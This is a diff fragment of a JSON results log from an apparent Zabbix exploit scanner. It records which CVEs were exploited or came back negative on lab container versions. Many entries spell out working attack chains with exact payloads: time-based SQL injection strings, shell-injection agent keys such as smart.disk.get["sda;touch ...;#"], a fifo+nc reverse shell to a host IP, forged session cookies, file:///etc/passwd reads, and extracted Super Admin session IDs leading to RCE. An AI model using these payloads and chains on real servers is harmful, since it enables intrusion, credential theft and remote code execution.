+   "note": "user.update(self, usrgrps=[admins]) rejected: 'Only Super admin users can update \"usrgrps\" parameter.' -> 5.0.43+ fix in place; groups after: [Guests]. Patched."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin -> disposable low user; API user.update",
+   "note": "Privesc confirmed: module created low user zbxlow010302, user.update added it to usergroup 7 (Zabbix administrators) — joined_groups shows usrgrpid 7. Verified via user.get selectUsrgrps."
+  }
+ ],
+ "CVE-2024-36469": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "negative",
+   "when": "2026-10-28",
+   "conditions": "default install, bcrypt10 cost",
+   "note": "login timing for existing vs non-existing username within noise (0.26-0.32s); signal not measurable on this lab — condition-only module, may differ on other configs."
+  },
+  {
+   "version": "7.0.0",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "default install, bcrypt10; 7.0.0 уязвим (<7.0.9 фикс)",
+   "note": "user.login timing oracle переработан: парные интерливированные замеры vs несуществующий sentinel, warmup, мин/медиана, sign-test (wins>=75% и медиана>0). Admin 12/14 wins (медиана +2.1ms), guest 14/14 (+3.3ms) — существующие медленнее (bcrypt verify в CUser::verifyPassword; несуществующий юзер short-circuit в checkSingleUserExists); root и not-exist-юзер корректно классифицированы как несуществующие. Детерминированная энумерация имён подтверждена."
+  }
+ ],
+ "CVE-2024-42325": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "Admin",
+   "note": "user.get returns cross-user login-attempt metadata (guest: attempt_failed=1/attempt_clock) for shared-group members — leak surface confirmed. Module CVE-2024-42325 (leak-detect)."
+  },
+  {
+   "version": "6.0.27-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin",
+   "note": "user.get (as Admin): 3 users, 0 leaked others' media/attempts. Running as Admin masks the low-priv shared-group leak primitive; no cross-user exposure observed."
+  },
+  {
+   "version": "6.0.31-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin",
+   "note": "user.get: 3 users, leaked_others=0. Same (admin context hides shared-group primitive)."
+  },
+  {
+   "version": "6.4.21-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin",
+   "note": "user.get: 3 users, leaked_others=0. 6.4 branch not in affected range for 42325 (6.0/5.0/7.0/7.2 only)."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "Admin; guest failed logins induced (attempt_failed=2)",
+   "note": "user.get returns cross-user login-attempt metadata: guest attempt_failed=2/attempt_clock visible to shared-group member (leaked_others=1). Leak surface confirmed on 7.0.0."
+  }
+ ],
+ "CVE-2024-42327": [
+  {
+   "version": "6.0.31-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "default creds Admin/zabbix; PostgreSQL backend",
+   "note": "time-based SQLi via user.get selectRole (pg_sleep oracle, binary search) -> extracted Super Admin sessionid from sessions (userid=1) -> script_rce -> uid=1997(zabbix) on server container. Full chain CVE-2024-42327 -> RCE verified live (zabbix-server-pgsql:6.0.31-alpine)."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "default creds Admin/zabbix; PostgreSQL backend",
+   "note": "Same chain re-verified on 7.0.0: selectRole SQLi -> Super Admin session -> script_rce uid=1997(zabbix). Live (zabbix-server-pgsql:7.0.0-alpine)."
+  },
+  {
+   "version": "6.0.49-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin/zabbix",
+   "note": "Patched detection: selectRole SQLi chain ran but extraction yielded a plain session (error 'Session terminated'; 'extracted session is not Super Admin (userid 1)'). 6.0.49 > fixed 6.0.32rc1; SQLi blast-decay confirms fix."
+  },
+  {
+   "version": "6.0.27-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin/zabbix; PostgreSQL backend",
+   "note": "selectRole SQLi oracle exercised (in-range 6.0.0..6.0.32rc1), time-based binary extraction completed, but produced a malformed/ non-Super-Admin session ('extracted session is not Super Admin (userid 1)'; first bytes '8[6765...'). Full extraction->impersonate->RCE chain NOT completed in this run (timing collision / no clean userid-1 session row). Same-class RCE chain already verified exploited on 6.0.31 (record above) and via trapper CVE-2024-22120 on 6.0.27."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin; time-based SQLi user.get selectRole -> Super Admin session -> script_rce --cmd 'id'",
+   "note": "Full chain exploited on fresh 7.0.0: selectRole SQLi extracted Super Admin session (ad971db9...), super_admin_probe OK (scriptids 7), script.execute returned uid=1997(zabbix). RCE confirmed. (First run hit a stale extracted session — 'Session terminated'; clean re-run on same stack succeeded.)"
+  },
+  {
+   "version": "6.0.31-alpine (mysql:8.0.46)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "MySQL 8.0.46 backend, fresh stack on own docker network zbxmysql_631 (zabbix-server-mysql:6.0.31-alpine + web-nginx-mysql + mysql:8.0 with --log-bin-trust-function-creators); Admin/zabbix",
+   "note": "MySQL flavor auto-detected (pg_sleep probe inert -> mysql). selectRole time-based oracle: control 0.066s vs IF(1=1,SLEEP(2),0)=2.06s vs false 0.069s. Binary search with IF(...,SLEEP(2),0) extracted Super Admin sessionid 7dc102118ab10a8071aaa73f4d841adb from sessions(userid=1); super_admin_probe OK (scriptids ['4']); ok:True."
+  },
+  {
+   "version": "7.0.0-alpine (mysql:8.0.46)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "MySQL 8.0.46 backend, fresh stack on own docker network zbxmysql_700 (zabbix-server-mysql:7.0.0-alpine + web-nginx-mysql + mysql:8.0); Admin/zabbix",
+   "note": "Second-stack re-verify: flavor=mysql auto-detected; extracted Super Admin session f3c0a92d1528979d0c420c006a4fc2ad, super_admin_probe OK (scriptids ['5']); ok:True. Same IF(cond,SLEEP(2),0) oracle on MySQL 8.0."
+  }
+ ],
+ "CVE-2025-27232": [
+  {
+   "version": "7.4.2-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "Super Admin web session (Admin/zabbix)",
+   "note": "LFI via oauth.authorize: state.token_url=file:///etc/passwd -> curl reads the file -> raw_response in 'Unexpected HTTP response status code' message. Differential probe confirmed (/etc/passwd content, +898 bytes vs bogus path). Live (zabbix-web-nginx-pgsql:7.4.2-alpine)."
+  },
+  {
+   "version": "7.4.2-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Super Admin web session (Admin/zabbix); --file /etc/passwd",
+   "note": "LFI via oauth.authorize confirmed: state.token_url=file:///etc/passwd, differential +898 bytes vs bogus path, FILE CONTENT LEAKED in raw_response. (Module import bug urllib.parse fixed this run.)"
+  },
+  {
+   "version": "7.4.16-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "Super Admin web session (Admin/zabbix); --file /etc/passwd",
+   "note": "oauth.authorize LFI on patched 7.4.16: no leak (filesize delta below threshold, leaked_head empty) — patched as expected (fix 7.4.3)."
   }
  ],
  "CVE-2025-27233": [
@@ -22,6 +985,13 @@
    "when": "2026-10-28",
    "conditions": "own agent2 container, wrapper around smartctl logs argv",
    "note": "Argument injection proven: smart.disk.get[device,mode] lands verbatim in the smartctl argv (-a MARKER -d MARKER) via the verified agent passive protocol ({\"request\":\"passive checks\",\"data\":[{key,timeout}]}). Primitive confirmed live; full ICE impact (NTLMv2/UNC on Windows, RCE flavor on 5.0.x) environment-dependent."
+  },
+  {
+   "version": "5.0.30-alpine agent2 (shell-backed lab)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "real stock docker image zabbix/zabbix-agent2:5.0.30-alpine (pristine 5.0.30, git revision 2c96c38 == tag 5.0.30, compiled Nov 28 2022) run as zlab_agent2_shellback, port 127.0.0.1:44688, passive allowlist Server=0.0.0.0/0 (ZBX_SERVER_HOST env); no mock: the stock build IS the vulnerable shell-backed agent (src/go/plugins/smart/smart_nix.go: executable := fmt.Sprintf(\"sudo -n %s %s\", path, args); zbxcmd_nix.go: exec.Command(\"sh\",\"-c\",s); params concatenated verbatim, no sanitization on 5.0.30). Command executed as uid=1997(zabbix) inside the agent container. Module zbxscan -m active -t 127.0.0.1 -exp CVE-2025-27233 --agent-port 44688 --cmd 'touch /tmp/zbx27233_rce_$(id -u)'",
+   "note": "Same primitive as CVE-2023-32728/27234 (smart.disk.get param -> smartctl argv -> sh -c string). Payload smart.disk.get[\"sda;touch /tmp/zbx27233_rce_$(id -u);#\"] executed. MARKER CREATED in agent container: /tmp/zbx27233_rce_1997 (uid=1997 zabbix). Stock 7.x exec-array agent2: argv-only, no RCE (injection reaches smartctl argv, shell never involved)."
   }
  ],
  "CVE-2025-27234": [
@@ -52,180 +1022,22 @@
    "when": "2026-10-28",
    "conditions": "module CVE-2025-27234 (agent2.py _session): --agent-port 10061 --revshell 172.18.0.1:<port> --cmd 'id; hostname' и --shell REPL",
    "note": "Модуль: --cmd/--shell подтверждены live. Payload обёрнут в (setsid sh -c '<fifo+nc chain>' </dev/null >/dev/null 2>&1 &) — переживает плагинный kill (~3s 'Timeout while executing a shell script'): --cmd вернул uid=1997(zabbix) + hostname c54cae9b6230, --shell исполнил id и hostname построчно, exit закрыл сессию. Без setsid старый foreground-вариант отдавал только баннер (sh умирал до прихода команды) — фикс обязателен."
-  }
- ],
- "CVE-2013-3628": [
-  {
-   "version": "5.4.8-alpine",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "same script-exec technique (shared module, verified through CVE-2021-46088)",
-   "note": "post-auth global-script RCE confirmed on 5.4.8."
-  }
- ],
- "CVE-2022-23131": [
-  {
-   "version": "5.4.8-alpine",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "SAML enabled (config.saml_auth_enabled=1) + dummy IdP + idp.crt",
-   "note": "Full chain: forged zbx_session (reused anon sessionid/sign + saml_data.username_attribute=Admin) -> index_sso.php -> Admin session (userid=1) -> script.execute RCE uid=1997(zabbix)."
   },
   {
-   "version": "5.4.8-alpine",
-   "result": "blocked",
-   "when": "2026-10-28",
-   "conditions": "default docker image, SAML disabled",
-   "note": "Forge yields a session cookie but login block is skipped (saml_auth_enabled=0) -> no identity. Condition check reflects this (unknown until active attempt)."
+   "version": "5.0.30-alpine agent2 (shell-backed lab)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "real stock docker image zabbix/zabbix-agent2:5.0.30-alpine (pristine 5.0.30, git revision 2c96c38 == tag 5.0.30, compiled Nov 28 2022) run as zlab_agent2_shellback, port 127.0.0.1:44688, passive allowlist Server=0.0.0.0/0 (ZBX_SERVER_HOST env); no mock: the stock build IS the vulnerable shell-backed agent (src/go/plugins/smart/smart_nix.go: executable := fmt.Sprintf(\"sudo -n %s %s\", path, args); zbxcmd_nix.go: exec.Command(\"sh\",\"-c\",s); params concatenated verbatim, no sanitization on 5.0.30). Command executed as uid=1997(zabbix) inside the agent container. Module zbxscan -m active -t 127.0.0.1 -exp CVE-2025-27234 --agent-port 44688 --revshell 172.17.0.1:44690 --cmd 'id; hostname; touch /tmp/zbx27234_rce' (container default gateway 172.17.0.1 = host bridge)",
+   "note": "Full fifo+nc interactive session through the shell-injection (setsid detached chain survives the 3s plugin timeout kill): captured '/bin/sh: can't access tty; job control turned off; /var/lib/zabbix $ uid=1997(zabbix) gid=1995(zabbix) groups=1995(zabbix),0(root)' + hostname 3017a12e26d5. MARKER CREATED: /tmp/zbx27234_rce (uid 1997). Also one-shot ';touch /tmp/zbx_lab_rce;#' verified via raw protocol (response 'Cannot unmarshal JSON' = command ran). Earlier 'argv-only' verdict on stock 5.0.30 was wrong: host probes were rejected by passive allowlist Server=127.0.0.1, and the first smart.* call fails at strict checkVersion ('sudo -n smartctl -j -V' without NOPASSWD) before diskGet; second call reaches the injection. Stock exec-array builds (7.x, 5.0.47+) remain argv-only."
   }
  ],
- "CVE-2022-23134": [
-  {
-   "version": "5.4.8-alpine",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "attacker PostgreSQL on same docker network, schema cloned; DB_TYPE POSTGRESQL, DB_ENCRYPTION=0",
-   "note": "Full takeover verified: forged zbx_session {step:6 + DB_host/port/db/user/pass + POSTGRESQL + encryption off} -> setup.php stage6 -> zabbix.conf.php rewritten to attacker DB -> login Admin/<attacker-known pass> succeeds, original creds fail. Live (zabbix-web-nginx-pgsql:5.4.8-alpine)."
-  }
- ],
- "CVE-2016-10134": [
-  {
-   "version": "3.0.3",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "source-built 3.0.3 (debian:jessie, mysql:5.6), guest session auto-login",
-   "note": "Unauthenticated error-based SQLi via jsrpc.php profileIdx2 (mode=1 screen.get, resourcetype=17): payload lands unescaped in INSERT INTO profiles idx2 -> MySQL error echoes value. Extracted ~5fce1b3e34b520afeffb37ce08c7cd666 = MD5('zabbix') = Admin passwd (users.passwd, default Admin/zabbix). Live (self-built zlab-old-zabbix:3.0.3, web 127.0.0.1:18080)."
-  }
- ],
- "CVE-2024-42327": [
-  {
-   "version": "6.0.31-alpine",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "default creds Admin/zabbix; PostgreSQL backend",
-   "note": "time-based SQLi via user.get selectRole (pg_sleep oracle, binary search) -> extracted Super Admin sessionid from sessions (userid=1) -> script_rce -> uid=1997(zabbix) on server container. Full chain CVE-2024-42327 -> RCE verified live (zabbix-server-pgsql:6.0.31-alpine)."
-  },
+ "CVE-2025-27237": [
   {
    "version": "7.0.0-alpine",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "default creds Admin/zabbix; PostgreSQL backend",
-   "note": "Same chain re-verified on 7.0.0: selectRole SQLi -> Super Admin session -> script_rce uid=1997(zabbix). Live (zabbix-server-pgsql:7.0.0-alpine)."
-  }
- ],
- "CVE-2020-11800": [
-  {
-   "version": "3.0.30",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "source-built 3.0.30 (debian:jessie, mysql:5.6) + auto-registration action enabled (actions eventsource=2 status=0, operations operationtype=2 'Add host'), trapper 127.0.0.1:18052",
-   "note": "Trapper RCE via auto-registration ip injection: active-checks request with ip='ffff:::;touch${IFS}/tmp/success11800m' (IPv6 is_ip6 parse bug allows the trailing shell) registers host zbxautof5bcef (hostid 10108); brute-forced command scriptid=1 (Ping, /bin/ping -c 3 {HOST.CONN}) executes server-side with the injected ip -> 'ping: unknown host ffff:::' + semicolon command ran. Marker /tmp/success11800m created by uid zabbix in server container (verified twice: hosts 10106/10108, markers success11800+success11800m). Live (zlab-old-zabbix:3.0.30)."
-  }
- ],
- "CVE-2025-27232": [
-  {
-   "version": "7.4.2-alpine",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "Super Admin web session (Admin/zabbix)",
-   "note": "LFI via oauth.authorize: state.token_url=file:///etc/passwd -> curl reads the file -> raw_response in 'Unexpected HTTP response status code' message. Differential probe confirmed (/etc/passwd content, +898 bytes vs bogus path). Live (zabbix-web-nginx-pgsql:7.4.2-alpine)."
-  }
- ],
- "CVE-2024-22120": [
-  {
-   "version": "6.0.27-alpine",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "default creds Admin/zabbix; trapper 10051 (mapped); PostgreSQL backend",
-   "note": "Blind time-based SQLi via trapper audit clientip verified live E2E -> RCE. Dual-time hex oracle (match: pg_sleep(2) else pg_sleep(0.6), ASCII equality, hex alphabet 0123456789abcdef), cross-checked against W01fh4cker/CVE-2024-22120-RCE and reporter PoC (support#236280) — identical. Extracted config.session_key (pos-1 byte flaked '1' vs 'd'; rest byte-exact to DB) and a real Super Admin sessionid 82ca9c81fb29777ef87471448281aac2 (verified in sessions, userid=1, status=0). script.create (super-admin only) accepted; script.execute returned uid=1997(zabbix) gid=1995(zabbix) on the 6.0.27 server. Full chain trapper SQLi -> admin session -> script RCE proven live. Cookie-forge mechanics (HMAC-SHA256(session_key, compact json)) validated separately; not required for the API-session RCE."
-  }
- ],
- "CVE-2024-36465": [
-  {
-   "version": "7.0.0-alpine",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "role User account (zbxlow…), PostgreSQL backend",
-   "note": "Time-based SQLi via API groupBy (CApiService): groupBy entry 'userid,(CASE WHEN … THEN pg_sleep ELSE NULL END)' evaluated per row. low user -> extracted Super Admin sessionid from sessions (userid=1) -> script.create probe (super-admin only) -> script_rce -> uid=1997(zabbix). Full chain verified live (7.0.0, no public PoC)."
-  }
- ],
- "CVE-2024-36464": [
-  {
-   "version": "7.0.0-alpine",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "Admin; mediatype Email with passwd set",
-   "note": "Detector verified live: mediatype.get(output extend) returns 'passwd' in cleartext (value_head SecretP@ss12…) — the export/YAML exposure surface confirmed. Module CVE-2024-36464 (leak-detect)."
-  }
- ],
- "CVE-2024-36460": [
-  {
-   "version": "7.0.0-alpine",
-   "result": "check-pass",
+   "result": "condition-only",
    "when": "2026-10-28",
    "conditions": "Admin",
-   "note": "auditlog.get exists on 7.0 and returns records matching 'passwd' (3 rows) — plaintext-password audit exposure surface confirmed. Module CVE-2024-36460 (leak-detect)."
-  }
- ],
- "CVE-2024-42325": [
-  {
-   "version": "7.0.0-alpine",
-   "result": "check-pass",
-   "when": "2026-10-28",
-   "conditions": "Admin",
-   "note": "user.get returns cross-user login-attempt metadata (guest: attempt_failed=1/attempt_clock) for shared-group members — leak surface confirmed. Module CVE-2024-42325 (leak-detect)."
-  }
- ],
- "CVE-2024-36467": [
-  {
-   "version": "7.0.0-alpine",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "low user (role User, group Guests) created then abused as attacker",
-   "note": "user.update added the low user to 'Zabbix administrators' (usrgrpid 7) — verified via user.get selectUsrgrps. Privesc chain confirmed live (zabbix-server-pgsql:7.0.0-alpine); 7.0 renamed API to usergroup.get."
-  }
- ],
- "CVE-2024-36469": [
-  {
-   "version": "7.0.0-alpine",
-   "result": "negative",
-   "when": "2026-10-28",
-   "conditions": "default install, bcrypt10 cost",
-   "note": "login timing for existing vs non-existing username within noise (0.26-0.32s); signal not measurable on this lab — condition-only module, may differ on other configs."
-  }
- ],
- "CVE-2022-46768": [
-  {
-   "version": "6.0.11-alpine",
-   "result": "exploited",
-   "when": "2026-10-28",
-   "conditions": "web-service container, AllowedIP open, seccomp=unconfined (chrome)",
-   "note": "POST /report {'url':'file:///etc/passwd','parameters':{w,h}} -> 200 application/pdf (%PDF-1.4, Chromium) — arbitrary file read from the web-service host confirmed live (zabbix/zabbix-web-service:6.0.11-alpine)."
-  },
-  {
-   "version": "6.0.27-alpine",
-   "result": "negative",
-   "when": "2026-10-28",
-   "conditions": "same probe",
-   "note": "400 'Unexpected URL scheme: file' — patched detection verified (fix 6.0.12rc1+)."
-  }
- ],
- "CVE-2023-29450": [
-  {
-   "version": "6.0.27-alpine",
-   "result": "negative",
-   "when": "2026-10-28",
-   "conditions": "Admin, item type 5 internal + JS step type 21",
-   "note": "created internal item with HttpRequest.get('file:///etc/passwd'); lastvalue = boottime value only, no file content — CURLOPT_PROTOCOLS block verified (actual code fix at 6.0.14). Positive repro needs server <6.0.14/5.0.32/6.2.8."
-  }
- ],
- "CVE-2024-22116": [
-  {
-   "version": "7.0.0-alpine",
-   "result": "negative",
-   "when": "2026-10-28",
-   "conditions": "Admin, host.update interface DNS",
-   "note": "interface DNS with shell meta-chars rejected by validation ('Incorrect interface DNS parameter') — the fix (7.0.0rc3); vulnerable builds (7.0.0a1-rc2, 6.4.9-6.4.15) accept and execute Ping on server. Positive repro needs a 7.0.0rc2/6.4.15 image (unavailable)."
+   "note": "Windows OpenSSL-config LPE — requires local access on a Windows host; condition module only, not testable in the Linux lab."
   }
  ],
  "CVE-2025-27240": [
@@ -242,51 +1054,27 @@
    "when": "2026-10-28",
    "conditions": "Admin creds; autoreg action 'Remove host'; visible name payload; trapper trigger after ~70s config-cache wait (CacheUpdateFrequency=60)",
    "note": "Live on zlab_6_0_27 (web 45495, trapper 44645, PG): server log '[Z3005] ... invalid input syntax for type integer: \"ZBX27604B\" [delete from autoreg_host where host='zpx'||CAST('ZBX27604B' AS int)||'x']'. Escalation async on 6.0; host-removal step (DBlock_hostids FOR UPDATE) can be skipped under DB load but the injected DELETE still executes — log/error evidence is the reliable channel, latency oracle is not (unlike 7.0.0). Same vulnerable code path as the fix diff."
-  }
- ],
- "ZBX-18134": [
-  {
-   "version": "5.0.5-alpine",
-   "result": "check-pass",
-   "when": "2026-10-28",
-   "conditions": "Admin; fresh 5.0.5 (no encryption configured)",
-   "note": "host.get output includes tls_psk/tls_psk_identity for a non-superadmin admin; no PSK set on the lab host so nothing to leak. Surface (field exposed to API) confirmed."
-  }
- ],
- "CVE-2023-32727": [
-  {
-   "version": "5.0.5-alpine",
-   "result": "not-implemented",
-   "when": "2026-10-28",
-   "conditions": "Admin; 5.0.5 in affected range (5.0.0-5.0.38)",
-   "note": "Module is a stub: run() returns ok:False with 'реализуйте пробу на unpatched-стеке' — no actual icmpping cmd-injection probe implemented."
-  }
- ],
- "CVE-2026-23921": [
+  },
   {
    "version": "7.0.0-alpine",
-   "result": "negative",
-   "when": "2026-10-28",
-   "conditions": "Admin; 7.0.0 in affected range (7.0.0-7.0.22), PostgreSQL backend",
-   "note": "sortfield blind SQLi oracle did not fire ('оракл не сработал — патч или иное поведение'). Not reproduced on 7.0.0."
-  }
- ],
- "CVE-2026-23925": [
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin; trapper 44666; pg_sleep(10) visible-name payload",
+   "note": "Time-based SQLi in autoreg_host delete confirmed: trigger answered in 15.05s for payload zpx'||(SELECT pg_sleep(10))||'x. op_host_del SQLi (CVE-2025-27240) exploited."
+  },
   {
-   "version": "7.0.0-alpine",
-   "result": "negative",
-   "when": "2026-10-28",
-   "conditions": "Admin; config.import with updateMissing",
-   "note": "Import rejected by permission: Invalid parameter '/rules/hosts': unexpected parameter 'updateMissing' — the 7.0 API rejects the payload. Not reproduced."
-  }
- ],
- "CVE-2026-59786": [
+   "version": "6.0.31-alpine (mysql:8.0.46)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "MySQL 8.0.46 backend, own docker network zbxmysql_631; autoreg 'Remove host' action; Admin/zabbix; trapper port 44709; --db-flavor mysql",
+   "note": "MySQL-specific payload fix: old 'zpx'||(SELECT SLEEP(10))||'x' failed with [Z3005] ERROR 1292 'Truncated incorrect DOUBLE value' (|| == OR in MySQL, string literals coerced under strict mode; action fired but query errored). New payload 'x' OR SLEEP(10) OR host='y' (row-dependent terms, no constant-folding, no numeric coercion, row survives so the op re-fires): trigger answered in 24.22s (attempt 6) with SLEEP(10) injected, host removed, sleep_seen True, ok:True. PG payload unchanged."
+  },
   {
-   "version": "7.0.0-alpine",
-   "result": "check-pass",
-   "when": "2026-10-28",
-   "conditions": "active-agent heartbeat to trapper 44650, no PSK/TLS auth",
-   "note": "Heartbeat accepted/processed without TLS authentication — no-auth heartbeat surface confirmed."
+   "version": "7.0.0-alpine (mysql:8.0.46)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "MySQL 8.0.46 backend, own docker network zbxmysql_700; --db-flavor mysql; trapper port 44773",
+   "note": "Second-stack re-verify with fixed MySQL payload 'x' OR SLEEP(10) OR host='y': trigger answered in 14.27s (attempt 2), host removed, sleep_seen True, ok:True (total run 21s; 7.0 config cache 10s vs 6.0 60s)."
   }
  ],
  "CVE-2026-1199": [
@@ -296,33 +1084,64 @@
    "when": "2026-10-28",
    "conditions": "concurrent wrong-password attempts",
    "note": ">5 simultaneous wrong logins passed without lockout — the failed-attempt counter does not account for concurrent attempts."
-  }
- ],
- "CVE-2024-36466": [
+  },
   {
    "version": "7.0.0-alpine",
-   "result": "negative",
-   "when": "2026-10-28",
-   "conditions": "Admin; forged zbx_session cookie",
-   "note": "Cookie signature validated strictly (no 'Sign out' variant reached) — bypass not achieved without guest/SAML-specific conditions on this config."
-  }
- ],
- "CVE-2024-22121": [
-  {
-   "version": "7.0.0-alpine",
-   "result": "negative",
-   "when": "2026-10-28",
-   "conditions": "low user; agent-config methods",
-   "note": "Blackbox: methods reachable by a low user are not role-blocked (potential contour), but the full vector is not published and no deterministic E2E lab exists."
-  }
- ],
- "CVE-2023-32728": [
-  {
-   "version": "5.0.46-alpine agent2",
    "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "8 concurrent wrong-password login attempts",
+   "note": ">5 simultaneous wrong logins passed without lockout: blocked_responses=0, ok=True. Concurrent failed-attempt counter bypass on 7.0.0 (in-range 7.0.0..7.0.28)."
+  },
+  {
+   "version": "7.4.2-alpine",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "8 concurrent wrong-password login attempts",
+   "note": ">5 simultaneous wrong logins without lockout (blocked_responses=0). Lockout counter bypass on in-range 7.4.2 (7.4.0..7.4.12)."
+  },
+  {
+   "version": "7.4.16-alpine",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "8 concurrent wrong-password login attempts",
+   "note": "8 concurrent wrong logins still pass without a 429/423 block on patched 7.4.16 — the concurrent-attempt accounting gap observed even beyond the recorded 7.4.12 fix boundary. Note: out of recorded range (fix 7.4.12); empirical gap persists -> flag for review."
+  }
+ ],
+ "CVE-2026-23921": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "negative",
    "when": "2026-10-28",
-   "conditions": "own agent2 container, raw passive protocol; smart.disk.get[device,mode]",
-   "note": "Arg-injection primitive confirmed: marker ZBXINJECT2334 lands verbatim in the smartctl argv. RCE flavor (5.0.0-5.0.39) needs a shell-backed build; 5.0.46 is past the RCE window."
+   "conditions": "Admin; 7.0.0 in affected range (7.0.0-7.0.22), PostgreSQL backend",
+   "note": "sortfield blind SQLi oracle did not fire ('оракл не сработал — патч или иное поведение'). Not reproduced on 7.0.0."
+  },
+  {
+   "version": "7.0.0",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin и low-privilege User (role User, группа 8) — оба исполняют; PostgreSQL; 7.0.0 в диапазоне",
+   "note": "Реальный вектор найден: CApiService::applyQuerySortOptions whitelist-bypass — при наличии groupBy whitelist sortfield = атакер-controlled groupBy; инъекция кладётся ПАРОЙ groupBy[payload]+sortfield[payload] (прежний модуль слал sortfield без groupBy — валидация резала; оракл не мог сработать). sleep исполняется: control 0.06s vs pg_sleep(1.0) 1.06s; time-based extraction current_database() -> 'zabbix' (8 символов). Фикс 7.0.22: allowed_sort_fields = array_intersect(sortColumns, groupBy) (дифф CApiService 7.0.21->7.0.22). По диффам: 7.4.5->7.4.6 тот же фикс, но в 7.4.2 event.get groupBy ограничен 'objectid', user.get отклоняет groupBy — в 7.4 вектор недостижим; в 7.2.14 ни один API-сервис не принимает groupBy — недостижим (notes в db/vulns.json обновлены)."
+  },
+  {
+   "version": "7.2.15-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "Admin; sortfield+groupBy pair across user.get/host.get; host.get with groupBy accepted",
+   "note": "Range check on 7.2.15: sortfield injection rejected — 'Sorting by field userid,(SELECT 1 FROM pg_sleep(1.0)) not allowed' and cross-check pair host.get control 0.04s vs pg_sleep(2) 0.05s (no delay). 7.2.15 is the fix version (max 7.2.15 exclusive) — patched, negative as expected."
+  },
+  {
+   "version": "7.4.2-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "Admin; groupBy+sortfield pair on user.get/event.get/host.get",
+   "note": "Range check on 7.4.2: vector unreachable — user.get rejects groupBy ('unexpected parameter groupBy'), event.get restricts groupBy to 'objectid', host.get pair returns 'Database error occurred' with no delay (control 0.04s vs pg_sleep(2) 0.04s). Same fix family as 7.0.22 (CApiService applyQuerySortOptions whitelist-bypass). Negative — 7.4.2 not vulnerable despite db range 7.4.0..7.4.6 (matches peer diff analysis; suggested range update)."
+  },
+  {
+   "version": "7.0.0-alpine (mysql:8.0.46)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "MySQL 8.0.46 backend, own docker network zbxmysql_700; sortfield+groupBy whitelist-bypass pair; Admin/zabbix",
+   "note": "MySQL quirk: default extraction query must be database() (current_database() is PostgreSQL-only) — module default now flavor-aware. flavor=mysql auto-detected (pg_sleep probe 0.067s, (SELECT sleep(1)) pair 6.058s — SLEEP in GROUP BY amplifies ~6x, stronger signal). Extracted database()='zabbix' (7 chars) via IF(ascii(...),sleep(1),0) subquery in the groupBy/sortfield pair; ok:True."
   }
  ],
  "CVE-2026-23924": [
@@ -332,69 +1151,71 @@
    "when": "2026-10-28",
    "conditions": "own agent2 container; docker plugin",
    "note": "Blackbox: container name reflected into the Docker API path as-is, but /archive file read requires docker.sock mounted on the agent — not present on the lab container. Not reproduced."
+  },
+  {
+   "version": "7.0.10-alpine agent2",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "own agent2 7.0.10 container with /var/run/docker.sock mounted (root user, Server=0.0.0.0/0); passive 10050 on 127.0.0.1:41500; docker plugin items over ZBXD 7.x protocol",
